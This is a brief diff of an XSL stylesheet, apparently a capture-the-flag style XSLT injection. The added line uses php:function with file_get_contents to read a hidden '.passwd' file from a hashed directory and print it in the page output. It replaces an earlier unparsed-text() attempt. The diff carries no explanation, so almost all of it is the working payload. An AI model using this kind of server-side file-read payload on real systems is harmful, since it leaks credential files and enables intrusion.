@@ -11,7 +11,7 @@
 			</div>
 			<div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
 				<p>
-                    <xsl:value-of select="unparsed-text('.6ff3200bee785801f420fba826ffcdee/.passwd', ‘utf-8')"/>
+					<xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
 				</p>
 			</div>
 		</xsl:for-each>
